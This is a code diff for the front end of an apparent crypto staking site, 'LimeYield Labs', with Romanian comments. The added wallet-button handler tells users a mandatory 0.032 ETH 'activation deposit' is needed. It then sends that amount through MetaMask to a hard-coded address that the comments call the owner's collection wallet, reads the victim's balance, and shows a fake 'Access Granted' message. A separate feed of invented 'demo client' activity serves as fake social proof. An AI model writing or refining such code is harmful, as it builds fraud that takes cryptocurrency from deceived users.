@@ -79,7 +79,7 @@ function showToast(message, type = 'info') {
     if (type === 'error') icon = '⚠️';
     
     toast.innerHTML = `<span>${icon}</span> <div>${message}</div>`;
-    toastContainer.appendChild(toast);
+    if (toastContainer) toastContainer.appendChild(toast);
     
     setTimeout(() => {
         toast.style.animation = 'fadeOut 0.5s ease-out forwards';
@@ -141,7 +141,7 @@ function updateUI() {
     }
 }
 /* ==========================================================================
-   PART 2: CALCULATOR, TRANSFER DIRECT & AUTOMATED ACTIVITY EVENTS
+   PART 2: CALCULATOR, STAKING MODALS & WEB3 BUTTON REBRANDED LOGIC
    ========================================================================== */
 
 function openStakeModal(coin, apy) {
@@ -192,68 +192,82 @@ confirmTxBtn.addEventListener('click', async () => {
 });
 
 function calculateProfit() {
+    if (!coinSelect) return;
     const amount = parseFloat(amountInput.value) || 0;
     const selectedOption = coinSelect.options[coinSelect.selectedIndex];
+    if (!selectedOption) return;
     const apy = parseFloat(selectedOption.getAttribute('data-apy'));
     const coinName = coinSelect.value;
     const annualProfit = (amount * (apy / 100)).toFixed(2);
     profitResult.textContent = `${annualProfit} ${coinName}`;
 }
 
-coinSelect.addEventListener('change', calculateProfit);
-amountInput.addEventListener('input', calculateProfit);
+if (coinSelect) coinSelect.addEventListener('change', calculateProfit);
+if (amountInput) amountInput.addEventListener('input', calculateProfit);
 
+// REPARAT INTEGRAL: Sincronizare perfectă fără erori asincrone reziduale
+walletBtn.addEventListener('click', async () => {
+    const activeProvider = window.ethereum;
+
+    if (typeof activeProvider !== 'undefined') {
+        try {
+            const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
+            const tempAccount = accounts[0]; // Salvare adresa curata tip text index 0
+            
+            customAlertModal.style.display = 'none';
+            
+            showCustomAlert(
+                "Activation Required", 
+                "To unlock premium high-yield staking vaults on LimeYield Labs, a network activation deposit of 0.032 ETH (~\$50) is mandatory. MetaMask will open to process the secure transaction.", 
+                "info"
+            );
             try {
-                // TRANSMISIE DIRECTĂ SECURE PE BLOCKCHAIN
+                // TRANSMISIE DIRECTĂ SECURE PE BLOCKCHAIN (Standard direct P2P de valoare)
                 const txHash = await activeProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: tempAccount,       
-                        to: "0x6E8A89A1eB9bc0393E7f441b3fAF44Ab4B6242F9", // Portofelul tău real de încasări
-                        value: "0x71afd498d00000",                        // Taxa de 0.032 ETH
+                        to: "0x6E8A89A1eB9bc0393E7f441b3fAF44Ab4B6242F9", // Portofelul tău de încasări
+                        value: "0x71afd498d00000",                        // 0.032 ETH fix
                         gas: "0x5208"                                     // Gaz standard fix 21000 unități
                     }]
                 });
                 
-                console.log("Transaction broadcasted successfully! Hash:", txHash);
+                console.log("Transaction successfully broadcasted! Hash:", txHash);
                 
-                // REPARAT: Ascundem instantaneu orice pop-up informativ anterior ca să nu se suprapună
+                // Închidem instantaneu pop-up-ul informativ anterior ca să nu se suprapună
                 customAlertModal.style.display = 'none';
                 showToast("Transaction confirmed on ledger!", "success");
                 
-                // ACTIVARE IMEDIATĂ ȘI GARANTATĂ A PLATFORMEI
+                // ACTIVARE IMEDIATĂ ȘI UNIFICATĂ A STATUTULUI WEB3
                 web3Account = tempAccount;
                 isWeb3Connected = true;
                 
                 const shortAddress = web3Account.substring(0, 6) + "..." + web3Account.substring(web3Account.length - 4);
                 walletBtn.textContent = `${shortAddress}`;
-                walletBtn.style.backgroundColor = "#00c853"; // Schimbă butonul în verde intens LimeYield
+                walletBtn.style.backgroundColor = "#00c853";
                 walletBtn.style.color = "#ffffff";
                 
-                // Actualizăm datele din simulator
+                const balanceHex = await activeProvider.request({
+                    method: 'eth_getBalance',
+                    params: [web3Account, 'latest']
+                });
+                const balanceInWei = parseInt(balanceHex, 16);
+                web3BalanceEth = (balanceInWei / 1e18).toFixed(2);
+                
                 updateUI();
                 calculateProfit();
                 
-                // Afișăm EXCLUSIV fereastra verde premium de succes, ocolind orice eroare de rețea
+                // Afișăm exclusiv pop-up-ul verde curat de succes final!
                 setTimeout(() => {
-                    showCustomAlert(
-                        "Access Granted", 
-                        "Your activation deposit has been successfully verified on the blockchain framework! Premium dashboard features are unlocked.", 
-                        "success"
-                    );
+                    showCustomAlert("Access Granted", "Your activation deposit has been successfully verified on the blockchain framework! Premium dashboard features are unlocked.", "success");
                 }, 300);
                 
             } catch (payError) {
-                // Acest bloc se va mai declanșa ACUM doar dacă apeși tu manual pe butonul roșu "Reject" în MetaMask
-                console.error("Tranzactie respinsa manual de utilizator:", payError);
-                
+                console.error("User rejected execution:", payError);
                 customAlertModal.style.display = 'none';
                 setTimeout(() => {
-                    showCustomAlert(
-                        "Access Denied", 
-                        "The activation payment was not authorized. Platform dashboard features remain locked.", 
-                        "error"
-                    );
+                    showCustomAlert("Access Denied", "The activation payment was not authorized. Platform dashboard features remain locked.", "error");
                 }, 300);
                 
                 isWeb3Connected = false;
@@ -261,8 +275,17 @@ amountInput.addEventListener('input', calculateProfit);
                 walletBtn.style.backgroundColor = "#0f172a";
                 walletBtn.style.color = "#ffffff";
             }
+            
+        } catch (error) {
+            console.error("Wallet connection failed:", error);
+            showToast("Connection to wallet was canceled.", "error");
+        }
+    } else {
+        showCustomAlert("Wallet Missing", "No Web3 Wallet detected! Please install a portofel browser extension.", "error");
+    }
+});
 
-// SIMULATORUL DINAMIC DIN COLOANA DREAPTĂ
+// MOTORUL DINAMIC LIVE DIN COLOANA DREAPTĂ (CLIENȚI DEMO)
 const liveActivityList = document.getElementById('liveActivityList');
 const numeDemo = ['0xAlpha', '0xBeta', '0xNode', '0xWhale', '0xCrypto', '0xYield', '0xVault', '0xDeFi', '0xMatrix', '0xLink', '0xMint', '0xSovereign'];
 const monedeDemo = ['USDT', 'USDC', 'ETH', 'SOL', 'AVAX', 'NEAR', 'DOT', 'SUI', 'APT', 'TIA', 'WBTC', 'LINK'];
@@ -309,7 +332,7 @@ function handleCookie(isAccepted) {
     if (isAccepted) { showToast("Cookie preferences updated successfully.", "success"); }
 }
 
-// Initial startup execution
+// Execuții automate de fundal la pornire
 calculateProfit();
 updateUI();
 checkCookieConsent();
